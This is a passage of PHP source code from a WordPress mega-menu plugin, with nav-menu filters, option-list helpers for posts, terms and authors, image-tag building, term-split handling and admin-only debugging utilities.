	if( isset( $args->megamax_instance ) && !isset( $args->megamax_segment ) ){
	//up( $args );

		if( megamaxmenu_op( 'skip_navigation' , 'general' ) == 'on' ){

			$skipnav_target_id = $args->container_id.'-skipnav';

			$skipnav = '<a href="#'.$skipnav_target_id.'" class="megamaxmenu-skipnav megamaxmenu-sr-only megamaxmenu-sr-only-focusable">'.__( 'Skip Navigation', 'megamaxmenu' ).'</a>';

			$skipnav_target = '<span id="'.$skipnav_target_id.'"></span>';

			$nav_menu = $skipnav . $nav_menu . $skipnav_target;
		}
	}
	return $nav_menu;
}
add_filter( 'wp_nav_menu' , 'megamaxmenu_skipnav_filter' , 11, 2 );

function megamaxmenu_responsive_toggle_filter( $nav_menu , $args ){
	//Add to MegaMaxMenu, ignore segments
	if( isset( $args->megamax_instance ) && !isset( $args->megamax_segment ) ){
	//up( $args );

		$megamaxmenu_responsive = megamaxmenu_op( 'responsive' , $args->megamax_instance ) == 'on';
		$megamaxmenu_responsive_toggle = megamaxmenu_op( 'responsive_toggle' , $args->megamax_instance ) == 'on';

		if( $megamaxmenu_responsive && $megamaxmenu_responsive_toggle ){

			$toggle_content = megamaxmenu_op( 'responsive_toggle_content' , $args->megamax_instance );
			$toggle_tag = megamaxmenu_op( 'responsive_toggle_tag' , $args->megamax_instance );
			$toggle_content_align = megamaxmenu_op( 'responsive_toggle_content_alignment' , $args->megamax_instance );
			$toggle_align = megamaxmenu_op( 'responsive_toggle_alignment' , $args->megamax_instance );
			$toggle_classes = megamaxmenu_op( 'responsive_collapse', $args->megamax_instance ) == 'off' ? 'megamaxmenu-responsive-toggle-open' : '';
			$toggle_args = array(
				'toggle_content'	=> $toggle_content,
				'tag'				=> $toggle_tag,
				'content_align'		=> $toggle_content_align,
				'align'				=> $toggle_align,
				'classes'			=> $toggle_classes,
			);
			if( isset( $args->theme_location ) ) $toggle_args['theme_location'] = $args->theme_location;
			$megamaxmenu_toggle = megamaxmenu_toggle( $args->container_id , $args->megamax_instance , false , $toggle_args);

			$nav_menu = $megamaxmenu_toggle . $nav_menu;
		}
		else{
			$responsive_status = '';
			if( !$megamaxmenu_responsive_toggle ){
				$responsive_status.= '[MegaMaxMenu Responsive Toggle Disabled] ';
			}
			if( !$megamaxmenu_responsive ){
				$responsive_status.= '[MegaMaxMenu Responsive Menu Disabled] ';
			}
			if( $responsive_status ) $nav_menu = '<!-- '.$responsive_status.'--> '.$nav_menu;
		}
	}
	return $nav_menu;
}
add_filter( 'wp_nav_menu' , 'megamaxmenu_responsive_toggle_filter' , 10, 2 );


/*
 * Add HTML comments around menu, optionally add content before menu
 */
function megamaxmenu_before_wp_nav_menu( $nav_menu, $args ){

	if( isset( $args->megamax_segment ) ) return $nav_menu; //Ignore segments

	if( isset( $args->megamax_instance ) ){

		$theme_loc = isset( $args->theme_location ) ? $args->theme_location : '';

		$nav_menu = "\n<!-- MegaMaxMenu [Configuration:$args->megamax_instance] [Theme Loc:$theme_loc] [Integration:$args->megamax_integration_type] -->\n". $nav_menu . "\n<!-- End MegaMaxMenu -->\n";

		//megamaxp( $args );
		$config_id = $args->megamax_instance;

		$before = $after = '';

		$before_content = megamaxmenu_op( 'content_before_nav' , $args->megamax_instance );
		if( $before_content ){
			$before = '<!-- MegaMaxMenu Content Before -->';
			$before.= do_shortcode( $before_content );
			$before.= '<!-- End MegaMaxMenu Content Before -->';
		}

		$nav_menu = $before . $nav_menu . $after;

	}

	return $nav_menu;
}
add_filter( 'wp_nav_menu', 'megamaxmenu_before_wp_nav_menu' , 20 , 2 );






function megamaxmenu_get_post_parent_ops( $ops = array() ){

	if( megamaxmenu_op( 'autocomplete_disable', 'general' ) == 'on' ){
		$ops[999] = __( 'Autocomplete disabled in Control Panel.  Please enter ID manually' , 'megamaxmenu' );
		return $ops;
	}

	$post_types = get_post_types( array(
		'public'		=> true,
		'hierarchical' 	=> true,
	));

	$max_posts = megamaxmenu_op( 'autocomplete_max_post_results', 'general' );
	if( !$max_posts ) $max_posts = 100;


	$post_args = array(
		'post_type'	=> $post_types,
		'posts_per_page' => $max_posts,
	);

	//WPML
	if( defined('ICL_SITEPRESS_VERSION') ){
		$post_args['suppress_filters'] = false;
	}

	$posts = get_posts( $post_args );

	foreach( $posts as $post ){
		$ops[$post->ID] = $post->post_title;
	}

	return $ops;

}


function megamaxmenu_get_author_ops(){

	$ops = array();

	if( megamaxmenu_op( 'dynamic_authors_disable', 'general' ) == 'on' ){
		$ops[999] = __( '[Authors selection disabled via Control Panel]' , 'megamaxmenu' );
		return $ops;
	}

	$authors = get_users( array(
		'who'	=> 'authors'
	));;

	foreach( $authors as $author ){
		$ops[$author->ID] = $author->data->display_name;
		//up( $author->data->display_name , 2 );
	}

	return $ops;
}


function megamaxmenu_get_post_type_ops(){
	$post_types = get_post_types(
		array(
			'public'	=> true,
		),
		'objects'
	);

	unset( $post_types['attachment'] );

	$ops = array();
	//up( $post_types );
	foreach( $post_types as $id => $type ){
		$ops[$id] = $type->label;
	}
	return $ops;
}

function megamaxmenu_get_term_ops_by_tax( $tax , $ops = array() ){

	if( megamaxmenu_op( 'autocomplete_disable', 'general' ) == 'on' ){
		$ops[999] = __( 'Autocomplete disabled in Control Panel.  Please enter ID manually' , 'megamaxmenu' );
		return $ops;
	}

	if( !is_array( $tax ) ) $tax = array( $tax );

	$max_terms = megamaxmenu_op( 'autocomplete_max_term_results', 'general' ); //for performance
	if( !$max_terms ) $max_terms = 100;

	$terms = get_terms( $tax ,
		array(
			'number'	=> $max_terms,
			'hide_empty'=> false,
		));

	foreach( $terms as $id => $term ){
		$ops[$term->term_id] = $term->name;
	}

	return $ops;
}



function megamaxmenu_get_taxonomy_ops(){
	$taxonomies = get_taxonomies(
		array(
			'public'	=> true,
		),
		'objects'
	);

	$ops = array();

	foreach( $taxonomies as $id => $tax ){
		$ops[$id] = $tax->label;
	}

	return $ops;
}


function megamaxmenu_get_term_ops( $ops = array() ){
	//trigger_error( "Simulating Autocomplete memory exception" , E_USER_ERROR );
	if( megamaxmenu_op( 'autocomplete_disable', 'general' ) == 'on' ){
		$ops[999] = __( 'Autocomplete disabled in Control Panel.  Please enter ID manually' , 'megamaxmenu' );
		return $ops;
	}

	$taxonomies = megamaxmenu_get_taxonomies();

	$max_terms = megamaxmenu_op( 'autocomplete_max_term_results', 'general' ); //for performance
	if( !$max_terms ) $max_terms = 100;

	$terms = get_terms( $taxonomies ,
		array(
			'number'	=> $max_terms,
			'hide_empty'=> false,
		));

	//$ops = array();

	foreach( $terms as $id => $term ){
		$ops[$term->term_id] = $term->name;
	}

	/* Stress Test
	for( $k = count( $terms )+1 ; $k < count( $terms ) + 1000 ; $k ++ ){
		if( $k % 6 == 0 ){
			$ops[$k] = 'Frogs';
		}
		else if( $k % 5 == 0 ){
			$ops[$k] = 'Lions';
		}
		else if( $k % 4 == 0 ){
			$ops[$k] = 'Aardvarks';
		}
		else if( $k % 3 == 0 ){
			$ops[$k] = 'Antelope';
		}
		else if( $k % 2 == 0 ){
			$ops[$k] = 'Puppies';
		}
		else $ops[$k] = 'Cat'.$k;
	}
	*/

	return $ops;
}

function megamaxmenu_get_taxonomies(){
	return get_taxonomies(
		array(
			'public'	=> true,
		)
	);
}


function megamaxmenu_get_image( $img_id = false , $post_id = false , $data = false , $args = array() ){

	extract( wp_parse_args( $args , array(
		'img_size'		=> 'inherit',
		'img_w'			=> '',
		'img_h'			=> '',
		'default_img' 	=> false,
	)));

	$config_id = _MEGAMAXMENU()->get_current_config();


	//Image
	$img = '';

	//If post is set, but img is not, get featured image
	if( !$img_id && $post_id ){
		$thumb_id = get_post_thumbnail_id( $post_id );
		if( $thumb_id ) $img_id = $thumb_id;
	}

	if( !$img_id ){
		$img_id = $default_img;
	}

	if( $img_id ){
		$atts = array();

		$atts['class'] = 'megamaxmenu-image';

		//Determine size of image to get
		if( $img_size == 'inherit' ){
			$img_size = megamaxmenu_op( 'image_size' , $config_id );
		}

		//echo '['.$img_size.']';
		$atts['class'].= ' megamaxmenu-image-size-'.$img_size;

		//Get the reight image file
		$img_src = wp_get_attachment_image_src( $img_id , $img_size );
		$atts['src']	= $img_src[0];



		//Apply natural dimensions if not already set
		if( megamaxmenu_op( 'image_set_dimensions' , $config_id ) ){
			if( $img_w == '' && $img_h == '' ){
				$img_w = $img_src[1];
				$img_h = $img_src[2];
			}
		}

		//Default dimensions if not natural
		if( !$img_w ){
			$img_w = megamaxmenu_op( 'image_width' , $config_id );
			$img_h = megamaxmenu_op( 'image_height' , $config_id );
		}



		//Add dimensions as attributes, with pixel units if missing
		if( $img_w ){
			//if( is_numeric( $img_w ) ) $img_w.='px';	//Should always be numeric only, no units
			$atts['width']	= $img_w;
		}
		if( $img_h ){
			//if( is_numeric( $img_h ) ) $img_h.='px';	//Should always be numeric only, no units
			$atts['height'] = $img_h;
		}

		//Add 'alt' & 'title'
		$meta = get_post_custom( $img_id );
		$alt = isset( $meta['_wp_attachment_image_alt'] ) ? $meta['_wp_attachment_image_alt'][0] : '';	//Alt field
		$title = '';

		if( $alt == '' ){
			$title = get_the_title( $img_id );
			$alt = $title;
		}
		$atts['alt'] = $alt;

		if( megamaxmenu_op( 'image_title_attribute' , $config_id ) == 'on' ){
			if( $title == '' ) $title = get_the_title( $img_id );
			$atts['title'] = $title;
		}

		//Build attributes string
		$attributes = '';
		foreach( $atts as $name => $val ){
			$attributes.= $name . '="'. esc_attr( $val ) .'" ';
		}

		$img = "<img $attributes />";
		//$img = "<span class='megamaxmenu-image'><img $attributes /></span>";

		if( $data ){
			$data = array();
			$data['img'] = $img;
			$data['w']	= $img_w;
			$data['h']	= $img_h;
			$data['atts'] = $atts;
			return $data;
		}
	}

	return $img;
}

function megamaxmenu_item_save_inherit_featured_image( $item_id , $setting , $val , &$saved_settings ){

	if( $val == 'cache' ){

		//Determine Featured Image
		$post_id = get_post_meta( $item_id , '_menu_item_object_id' , true );
		$thumb_id = get_post_thumbnail_id( $post_id );

		//Assign Featured Image
		$saved_settings['item_image'] = $thumb_id;
		update_post_meta( $item_id , MEGAMAXMENU_MENU_ITEM_META_KEY , $saved_settings );

	}
}


function megamaxmenu_display_retractors(){
	//echo megamaxmenu_op( 'retractor_display_strategy' , 'general' );
	switch( megamaxmenu_op( 'retractor_display_strategy' , 'general' ) ){
		case 'responsive':
			return true;
		case 'mobile':
			return megamaxmenu_is_mobile( 'display_retractors' );
		case 'touch':
			return true;
		default:
			return true;
	}
	return true;
}


function megamaxmenu_is_mobile( $scenario = false ){
	return apply_filters( 'megamaxmenu_is_mobile' , wp_is_mobile() , $scenario );
}


/** Term Splitting in WordPress 4.2 **/
add_action( 'split_shared_term', 'megamaxmenu_split_shared_term', 10, 4 );
function megamaxmenu_split_shared_term( $term_id, $new_term_id, $term_taxonomy_id, $taxonomy ){
	global $wpdb;
	$megamax_meta = $wpdb->get_results(
		$wpdb->prepare( "SELECT post_id , meta_value FROM $wpdb->postmeta where meta_key = %s AND meta_value IN( %s , %s )", '_megamaxmenu_custom_item_type' , 'dynamic_terms' , 'dynamic_posts' )
	);

	//echo count( $megamax_meta );

	foreach( $megamax_meta as $meta ){
		$meta->post_id;
		//$meta->meta_value; //dynamic_terms or dynamic_posts

		$m = get_post_meta( $meta->post_id , MEGAMAXMENU_MENU_ITEM_META_KEY , true );

		if( $meta->meta_value == 'dynamic_terms' ){

			$update = false;

			//Only if $taxonomy is checked
			if( isset( $m['dt_taxonomy'] ) && in_array( $taxonomy , $m['dt_taxonomy'] ) ){

				if( isset( $m['dt_parent'] ) && $m['dt_parent'] ){
					if( $m['dt_parent'] == $term_id ){
						$m['dt_parent'] = $new_term_id;
						$update = true;
					}
				}
				if( isset( $m['dt_child_of'] ) && $m['dt_child_of'] ){
					if( $m['dt_child_of'] == $term_id ){
						$m['dt_child_of'] = $new_term_id;
						$update = true;
					}
				}
				if( isset( $m['dt_exclude'] ) && $m['dt_exclude'] ){
					$exclude_list = explode( ',' , $m['dt_exclude'] );
					if( in_array( $term_id , $exclude_list ) ){
						foreach( $exclude_list as $k => $val ){
							if( $val == $term_id ){
								$exclude_list[$k] = $new_term_id;
							}
						}
						$m['dt_exclude'] = implode( ',' , $exclude_list );
						$update = true;
					}
				}

				if( $update ){
					update_post_meta( $meta->post_id , MEGAMAXMENU_MENU_ITEM_META_KEY , $m );
					//megamaxp( $m , 3 );
				}
			}
		}
		else if( $meta->meta_value == 'dynamic_posts' ){

			//just check dp_{$taxonomy}
			$tax_setting = 'dp_'.$taxonomy;
			if( isset( $m[$tax_setting] ) && $m[$tax_setting]){
				if( $m[$tax_setting] == $term_id ){
					$m[$tax_setting] = $new_term_id;
					update_post_meta( $meta->post_id , MEGAMAXMENU_MENU_ITEM_META_KEY , $m );
					//megamaxp( $m , 3 );
				}
			}

		}

	}
}

//Term Split Tests
//do_action( 'split_shared_term', 100 , 200 , 300 , 'location' );
//do_action( 'split_shared_term', 50 , 150 , 250 , 'category' );





/* Allow HTML descriptions */
/* Off by default because it will fill all descriptions with the post content.
remove_filter( 'nav_menu_description', 'strip_tags' );
add_filter( 'wp_setup_nav_menu_item', 'megamaxmenu_allow_description_html' );
function megamaxmenu_allow_description_html( $menu_item ) {
     $menu_item->description = apply_filters( 'nav_menu_description', $menu_item->post_content );
     return $menu_item;
}
*/



/** Admin Notices **/
function megamaxmenu_user_is_admin(){
	return current_user_can( 'manage_options' );
}

function megamaxmenu_admin_notice( $content , $echo = true ){
	//$showtips = false;

	if( megamaxmenu_op( 'admin_notices' , 'general' ) == 'on' ){
		if( megamaxmenu_user_is_admin() ){
			$notice = '<div class="megamaxmenu-admin-notice"><i class="megamaxmenu-admin-notice-icon fas fa-lightbulb"></i>'.$content.'</div>';

			if( $echo ) echo $notice;
			return $notice;
		}
	}

}
function megamaxmenu_is_pro(){
	if( !defined( 'MEGAMAXMENU_PRO' ) ){
		return false;
	}
	if( !MEGAMAXMENU_PRO ){
		return false;
	}

	//We're in pro, now check for Lite Mode
	//We don't use megamaxmenu_op because that function needs to check this function
	//when getting defaults, so it would create an infinite loop and the universe would implode
	$general_settings = get_option( MEGAMAXMENU_PREFIX.'general' , false );

	//No settings, Pro Mode
	if( $general_settings === false ){
		return true;
	}
	if( isset( $general_settings['lite_mode'] ) ){
		//If lite mode, pro is false
		if( $general_settings['lite_mode']  == 'on' ){
			return false;
		}
	}
	return true;
}



function megamaxmenu_get_support_url(){
	return _MEGAMAXMENU()->get_support_url();
}


/** DEBUGGING **/


function megamaxp( $d , $depth = 1 ){
	echo '<pre>';
	//print_r( $d );
	echo UMVarDumper::dump( $d , $depth );
	echo '</pre>';
}

class UMVarDumper
{
        private static $_objects;
        private static $_output;
        private static $_depth;

        /**
         * Converts a variable into a string representation.
         * This method achieves the similar functionality as var_dump and print_r
         * but is more robust when handling complex objects such as PRADO controls.
         * @param mixed variable to be dumped
         * @param integer maximum depth that the dumper should go into the variable. Defaults to 10.
         * @return string the string representation of the variable
         */
        public static function dump($var,$depth=10,$highlight=false)
        {
                self::$_output='';
                self::$_objects=array();
                self::$_depth=$depth;
                self::dumpInternal($var,0);
                if($highlight)
                {
                        $result=highlight_string("<?php\n".self::$_output,true);
                        return preg_replace('/&lt;\\?php<br \\/>/','',$result,1);
                }
                else
                        return self::$_output;
        }

        private static function dumpInternal($var,$level)
        {
                switch(gettype($var))
                {
                        case 'boolean':
                                self::$_output.=$var?'true':'false';
                                break;
                        case 'integer':
                                self::$_output.="$var";
                                break;
                        case 'double':
                                self::$_output.="$var";
                                break;
                        case 'string':
                                self::$_output.="'$var'";
                                break;
                        case 'resource':
                                self::$_output.='{resource}';
                                break;
                        case 'NULL':
                                self::$_output.="null";
                                break;
                        case 'unknown type':
                                self::$_output.='{unknown}';
                                break;
                        case 'array':
                                if(self::$_depth<=$level)
                                        self::$_output.='array(...)';
                                else if(empty($var))
                                        self::$_output.='array()';
                                else
                                {
                                        $keys=array_keys($var);
                                        $spaces=str_repeat(' ',$level*4);
                                        self::$_output.="array\n".$spaces.'(';
                                        foreach($keys as $key)
                                        {
                                                self::$_output.="\n".$spaces."    [$key] => ";
                                                self::$_output.=self::dumpInternal($var[$key],$level+1);
                                        }
                                        self::$_output.="\n".$spaces.')';
                                }
                                break;
                        case 'object':
                                if(($id=array_search($var,self::$_objects,true))!==false)
                                        self::$_output.=get_class($var).'#'.($id+1).'(...)';
                                else if(self::$_depth<=$level)
                                        self::$_output.=get_class($var).'(...)';
                                else
                                {
                                        $id=array_push(self::$_objects,$var);
                                        $className=get_class($var);
                                        $members=(array)$var;
                                        $keys=array_keys($members);
                                        $spaces=str_repeat(' ',$level*4);
                                        self::$_output.="$className#$id\n".$spaces.'(';
                                        foreach($keys as $key)
                                        {
                                                $keyDisplay=strtr(trim($key),array("\0"=>':'));
                                                self::$_output.="\n".$spaces."    [$keyDisplay] => ";
                                                self::$_output.=self::dumpInternal($members[$key],$level+1);
                                        }
                                        self::$_output.="\n".$spaces.')';
                                }
                                break;
                }
        }
}

//Usage:
//$profiler = new UMProfiler();	//before
//$profiler->output( "Name of Object" );  //after

class UMProfiler{

	var $mem_before;
	var $mem_peak_before;
	var $mem_after;
	var $mem_peak_after;
	var $mem_diff;
	var $mem_peak_diff;


	function __construct(){
		$this->mem_before = memory_get_usage();
		$this->mem_peak_before = memory_get_peak_usage();
	}

	function terminate(){
		$this->mem_after = memory_get_usage();
		$this->mem_peak_after = memory_get_peak_usage();

		$this->mem_diff = $this->mem_after - $this->mem_before;
		$this->mem_peak_diff = $this->mem_peak_after - $this->mem_peak_before;


	}

	function output( $label , $threshold = 0 ){

		$this->terminate();

		if( !current_user_can( 'manage_options' ) ) return;

		if( $this->mem_peak_diff >= $threshold ){

			echo '<div class="profiler-item">'.$label.'</div>';
			echo '<div class="profiler-data">';

			if( $this->mem_peak_diff > 0 ){
				echo '<div class="profiler-data-segment">';
				echo '[Peak: ' .umbytes( $this->mem_peak_diff ) .']';
				echo '</div>';

				echo '<div class="profiler-data-segment">';
				echo '[Net: ' . umbytes( $this->mem_diff ) .']';
				echo '</div>';
			}
			else{
				echo '[Peak: 0]';
			}


			global $_bytes; //, $_bytes_peak;
			//$_bytes_peak+= $this->mem_peak_diff;
			$_bytes+= $this->mem_diff;
			echo '<div class="profiler-data-segment">Total: ' . umbytes( $_bytes ).'</div>';
			echo '<div class="profiler-data-segment">Peak: ' . umbytes( $this->mem_peak_after ).'</div>';

			echo '</div>';
		}

	}
}

function umbytes($size, $precision = 2){
	$base = log($size) / log(1024);
	$suffixes = array('', 'k', 'M', 'G', 'T');
	return round(pow(1024, $base - floor($base)), $precision) . $suffixes[floor($base)];
}




/*
 * Add compatibility with Conditional Menus by Themify
 */
add_filter( 'conditional_menus_theme_location', 'megamaxmenu_restore_conditional_menus_theme_location' , 10 , 3 );
function megamaxmenu_restore_conditional_menus_theme_location( $theme_loc , $new_menu, $args ){
   //megamaxp( $args );
   return $args['theme_location'];
}




/*
 * The strategy is to find all the MegaMaxMenu items, remove them, and move their children up a level
 *
 * 1. Make a map of parent > child relationships
 * 2. Determine which items are MegaMaxMenu advanced items.
 *    - Take the children of these items, and change their parent IDs to that of the MegaMaxMenu item
 *    - Mark the MegaMaxMenu item for deletion by recording their index
 * 3. Remove the MegaMaxMenu items by unsetting their indexes.
 *    - We can't do it simultaneuously in step 2, as that would alter the index and break the algorithm
 *
 * Note: if there is an MegaMaxMenu top level item with children, all those children will become top level items
 *    - One option would be to have a "disable child items that would become top level items" setting.
 */
function megamaxmenu_exclude_advanced_items( $sorted_menu_items, $args ) {

//megamaxp( $sorted_menu_items , 3 );

  if( is_admin() ) return $sorted_menu_items;

  //Ignore MegaMaxMenu and ShiftNav
  if( isset( $args->megamax_instance ) ||
			isset( $args->shiftnav ) ){
    return $sorted_menu_items;
  }

  //megamaxp( $items ,3 );
  $items = $sorted_menu_items;
  //megamaxp( $args );

  $child_map = array(); //$parent => array of children

  //First we have to track parents
  foreach ( $items as $index => $item ) {
    $parent_id = $item->menu_item_parent;
    $item_id = $item->ID;

    if( !isset( $child_map[$parent_id] ) ){
      $child_map[$parent_id] = array();
    }
    $child_map[$parent_id][] = array( 'id'  => $item_id , 'index' => $index );
  }

  //megamaxp( $child_map , 3 );

  $index_trash = array();

  //Now search for MegaMaxMenu items, but keep all the indexes intact
  foreach ( $items as $index => $item ) {
    if( $item->object == 'megamaxmenu-custom' ){

      //Does this item have children?
      if( isset( $child_map[$item->ID] ) ){
        //Send the kiddos to grandma's house
        foreach( $child_map[$item->ID] as $k => $child_data ){
          //Update items
          $items[$child_data['index']]->menu_item_parent = $item->menu_item_parent;
          //Update child map - no, if we do that we break this loop
          //$child_map[$item->menu_item_parent]
        }
      }

      //Keep track of indexes to unset
      $index_trash[] = $index;
      //unset( $items[$key] );
    }
  }

  //Finally, remove all items that are from MegaMaxMenu
  foreach( $index_trash as $k => $index ){
    unset( $items[$index] );
  }


  //megamaxp( $item );
    //if ( $item->object_id == 168 ) unset( $items[$key] );

  return $items;
}



/* Theme Template Backtrace */
add_action( 'wp' , function() {
	if( current_user_can( 'manage_options' ) && megamaxmenu_op( 'theme_template_backtrace' , 'general' ) === 'on' ){
		add_filter( 'wp_nav_menu' , 'megamaxmenu_theme_template_backtrace' , 100 , 2 );
	}
});

function megamaxmenu_theme_template_backtrace( $nav_menu , $args ){
  if( !isset( $args->megamax_segment ) ){ //ignore menu segments
      //megamaxp( $args );
      $backtrace = debug_backtrace();
      //megamaxp( $backtrace , 3 );


      $html = '<strong>Theme Template Backtrace: wp_nav_menu() call</strong><ul>';
      foreach( $backtrace as $step ){
        if( $step['file'] && strpos( $step['file'] , 'wp-content/themes' ) !== false ){
          $html.= '<li>'.$step['file'].'</li>';
        }
      }
      $html.= '</ul>';

      megamaxmenu_admin_notice( $html );
  }
  return $nav_menu;
}
